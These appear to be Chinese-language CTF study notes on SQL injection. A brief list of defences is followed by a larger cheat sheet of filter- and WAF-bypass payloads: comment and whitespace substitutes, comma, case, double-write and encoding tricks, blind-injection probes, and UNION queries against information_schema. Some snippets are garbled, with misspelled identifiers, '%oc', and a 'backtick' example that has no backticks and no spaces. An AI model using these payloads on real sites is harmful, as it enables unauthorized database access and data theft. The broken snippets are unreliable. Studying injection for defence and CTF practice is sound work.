#### SQL注入常见的过滤方法：

```
参数化查询：
使用数据库提供的参数化查询接口，这样用户输入会被数据库当作数据处理，而不是SQL命令的一部分。

使用ORM框架：
对象关系映射（ORM）框架通常自带防止SQL注入的机制，因为它们使用参数化查询或自己的抽象层来处理数据。

输入验证：
对所有用户输入进行验证，确保它们符合预期的数据类型和格式。例如，如果期望的输入是数字，确保输入不是字符串或其他数据类型。

白名单过滤：
只允许已知安全的数据通过，而不是尝试识别和过滤掉所有可能的危险输入。

黑名单过滤：
识别并拒绝包含潜在危险字符或字符串的输入，如SQL关键字（SELECT、INSERT、DELETE等）。

正则表达式：
使用正则表达式来验证用户输入是否符合特定的模式，从而阻止不符合模式的输入。

转义特殊字符：
对用户输入中的特殊字符（如单引号、分号等）进行转义，使它们在SQL语句中不再具有特殊含义。

使用安全的API和函数：
选择安全的数据库访问API和函数，避免那些允许直接执行SQL命令的API。

限制数据库权限：
限制应用程序使用的数据库账户权限，确保它们没有必要的权限去执行潜在的危险操作。

使用Web应用防火墙（WAF）：
部署WAF可以帮助过滤掉包含SQL注入攻击尝试的请求。

输出编码：
对所有输出到页面的数据进行适当的编码，以防止跨站脚本（XSS）攻击，这也间接有助于减少SQL注入的风险。

错误处理：
定制错误消息，避免在错误响应中泄露数据库结构或敏感信息。

使用HTTPonly和Secure标志：
对于Cookies，使用HTTPonly标志可以防止客户端脚本访问，使用Secure标志可以确保通过HTTPS传输。

内容安全策略（CSP）：
通过实施内容安全策略，可以减少XSS攻击的风险，间接降低SQL注入的可能性。

定期安全审计和代码审查：
定期对应用程序代码进行安全审计和代码审查，以发现和修复潜在的安全漏洞。
```

---

常见ascii符号

```
%09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格),%oc(换页),/**/(注释),00(空字符),0d(回车符)
```

---

在有时候`where`被过滤时，可以用`having`代替

---

正则表达式

- *SQL中的正则表达式主要使用REGEXP或RLIKE关键词进行匹配*

---

#### 逗号过滤绕过方法

sql语句中有三个地方要用到逗号：1、函数中的逗号`Substr(database(),1,1)` 2、限制记录`Limit 1,2` 3、分隔列名`union select 1,2,3`

一、`from for`绕过

主要用在函数内，用来截取第几个字符:

`from x for y` x是从第x个开始读取，y是读取的长度

二、`offset`绕过

格式：`select * from user limit 2 offset 0;`从第0条数据开始，返回两条数据

需要注意，limit 1,2 指的是从第一行往后取2行（包括第一行和第二行)；而limit 1 offset 2是从第一行开始只取第二行

三、`join`绕过

`join`可以将多个表连接起来

使用实例：`select * from user where id=1 union select 1,2,3;`改成`select * from user where id=1 union select * from ((select1)a JOIN (select2)b JOIN (select3)c);`

---

#### SQL语句like用法

语法格式：select * from 表名 where 字段名 like 对应值

**%**：1、like 'a%'——搜索所有以a开头的所有字符串

​       2、like '%a'——搜索所有以a结尾的所有字符串

​       3、like '%a%'——搜索在任何位置包含a的所有字符串

---

**几种绕过空格限制的方法：**

+ URL编码：

	1. 最常用的空格替换是 %20，这是空格的标准URL编码。
	2. 在某些情况下，%A0（代表不换行空格）也可能有效，尤其是在Mysql环境中。
	3. 其他可能的编码包括 %0A（换行）、%0B（垂直制表）、%0C（表格制表）、%0D（回车）、%09（水平制表）等，它们在特定上下文中可能被解析为空格。

+ 特殊字符：

	1. 使用全角空格（　），在一些不严格的过滤机制中可能被接受。
	2. 非打印字符，如%C2%A0（Unicode的不换行空格）。

+ 注释符和字符串连接：

	在SQL注入场景中，可以利用注释符（如-- 或 /* ... */）来规避空格需求，或者在条件语句中使用字符串连接符（如MySQL中的concat()函数）来构造无需空格的语句。

+ 编码转换：
	利用HTML实体编码，如 &#32; 表示空格，但这通常不适用于URL或查询参数，更适合于HTML内容本身。

+ 多字节字符：
	某些多字节字符（尤其是全角字符或特殊Unicode字符）在某些系统或库中可能被解释为空格。

+ 利用编程语言特性：
	在一些语言中，如Python，空格在某些上下文中可能不是必需的（如使用点号访问属性时）。

+ 调整语法结构：
	重新组织SQL查询或其他命令的结构，避免需要空格的地方。

+ 利用特定漏洞或弱点：
	如文件路径处理中的特殊案例，可能允许使用非标准字符作为路径分隔符。

---

注入点为**数值型注入**时，可往题目原访问点传一个-1,由于id通常不为负数,后端根据id查询不到内容,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置

---

SQL注入

**注释符**

```
'#', '--+', '-- -', '%23', '%00', '/**/'
```

 **"and、or" 过滤**

```SQL
可以使用"&&"和"||"代替
?id=1 && 1=1 --+

# 盲注，异或运算相同为0，不同为1；根据返回值0，1判断
?id=1 union select (substr(database(),1,1)='s') ^ 0 --
```

**大小写绕过**

```SQL
id=-1' UnIoN SeLeCT xxx
```

**双写绕过**

适用于将关键词置空的场景

```SQL
id=-1'UNIunionONSeLselectECT1,2,3–-
```

**编码绕过**

可以使用URL，hex，ASCII等编码绕过

例如'or 1=1

```SQL
27%20%4F%52%201%3D%31%20%2D%2D
```

**注释绕过**

内联注释/**/将关键词分隔开

```SQL
id=1' UN/**/ION SE/**/LECT database() --
```

**空格过滤**

内联注释代替空格

```SQL
id=1/**/and/**/1=1
```

**括号嵌套**

```SQL
select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());
```

**制表符、换行、不可见空格**

```SQL
%09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格),%oc(换页)
```

**反引号**

```SQL
union(selecttable_name,table_typefrominformation_schema.tables);
```

#### 比较符号 "=、<、>"过滤

in()

```SQL
ascii(substr(select database(),1,1)) in(115);        //根据回显判断
```

like

```
like代替'='
```

正则表达式

```SQL
select database() regexp '^s'; //根据回显判断
```

